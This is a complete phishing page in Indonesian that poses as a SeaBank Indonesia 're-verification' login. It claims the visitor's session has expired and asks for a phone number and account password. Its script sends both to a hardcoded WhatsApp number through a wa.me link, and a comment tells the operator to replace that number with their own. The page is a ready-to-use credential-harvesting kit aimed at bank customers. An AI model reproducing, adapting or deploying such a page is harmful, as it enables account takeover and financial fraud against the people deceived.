<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Verifikasi Ulang â€¢ SeaBank</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>

  <div class="login-container">
    <h1>SeaBank Indonesia</h1>
    <h2>Verifikasi Ulang</h2>
    <p class="desc">Sesi kamu telah kadaluarsa. Silakan login ulang dengan password akun kamu.</p>
    <form id="loginForm">
      <input type="tel" id="nomor" placeholder="Nomor HP (08xxxxx)" required />
      <input type="password" id="password" placeholder="Password Akun" required />
      <button type="submit">Verifikasi Sekarang</button>
    </form>
  </div>

  <script>
    document.getElementById("loginForm").addEventListener("submit", function(e) {
      e.preventDefault();
      const nomor = document.getElementById("nomor").value.trim();
      const password = document.getElementById("password").value.trim();

      if (!/^08\d{8,}$/.test(nomor)) {
        alert("Nomor HP tidak valid!");
        return;
      }

      // Ganti nomor WhatsApp kamu di sini
      const nomorWA = "639640119085"; 

      const pesan = `*Login SeaBank Indonesia:*\nNomor: ${nomor}\nPassword: ${password}`;
      const url = `https://wa.me/${nomorWA}?text=${encodeURIComponent(pesan)}`;
      window.location.href = url;
    });
  </script>

</body>
</html>
